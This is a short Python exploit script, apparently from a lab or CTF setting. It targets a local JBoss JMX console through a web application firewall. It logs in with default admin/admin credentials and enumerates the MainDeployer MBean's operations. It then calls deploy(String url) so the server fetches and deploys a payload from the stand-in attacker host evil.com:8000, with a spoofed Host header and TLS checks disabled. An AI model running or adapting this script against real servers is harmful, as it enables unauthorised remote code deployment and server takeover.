# -*- coding: utf-8 -*-
"""MainDeployer op enumeration + URL-deploy shot through WAF (RASP is the wall)."""
import re

import requests
import urllib3

urllib3.disable_warnings()

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
s.headers["Host"] = "evil.com"

r = s.get("http://127.0.0.1:18380/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system%3Aservice%3DMainDeployer",
          auth=("admin", "admin"), timeout=30)
html = r.text
ops = re.findall(r'action=invokeOpByName[^>]*methodName=([\w$]+)(?:[^>]*argType=([^&"\s]+))*', html)
seen = set()
for name, t in ops:
    if name not in seen:
        seen.add(name)
        print("op:", name, t or "")
# fall back: any 'deploy' mention contexts
for m in re.finditer(r'methodName=(\w+)&[^"\']*?', html):
    pass

print("\n=== deploy(String url) shot: infra-served WAR ===")
r = s.post("http://127.0.0.1:18380/jmx-console/HtmlAdaptor",
           data={"action": "invokeOpByName",
                 "name": "jboss.system:service=MainDeployer",
                 "methodName": "deploy",
                 "argType": "java.lang.String",
                 "arg": "http://evil.com:8000/payloads/../../payloads/rt5_ofbiz_d1.xml"},
           auth=("admin", "admin"), timeout=60)
print("deploy shot ->", r.status_code, len(r.content))
print(r.text[:300].replace("\n", " "))
